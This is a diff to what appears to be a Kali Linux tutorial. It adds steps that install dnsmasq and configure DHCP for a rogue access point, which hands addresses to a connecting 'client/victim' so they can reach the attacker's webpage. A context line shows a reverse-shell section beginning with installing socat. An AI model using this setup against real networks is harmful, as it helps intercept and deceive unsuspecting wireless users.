@@ -145,6 +145,45 @@ after installation ,type
 /etc/init.d/mysql start
 ```
 
+5.Install dnsmasq in Kali Linux
+
+```
+apt-get update
+apt-get install dnsmasq -y
+```
+This will update the cache and install latest version of dhcp server in your Kali Linux box.
+
+Now all the required tools are installed. We need to configure apache and the dhcp server so that the access point will 
+
+allocate the IP address to the client/victim and the client would be able to access our webpage remotely.
+
+Now we will define the IP range and the subnet mask for the DHCP server.
+
+6.Configure dnsmasq
+
+Create a configuration file for dnsmasq using `vim` or your favorite text editor and add the following code.
+
+```
+vi ./conf/dnsmasq.conf
+```
+dnsmasq.conf
+
+```
+interface=at0         
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+```
+
+```
+Tip: Replace at0 with wlan0 everywhere when hostapd is used for creating an access point
+```
+
+
 ###  Reverse shell
 
 1. install socat 
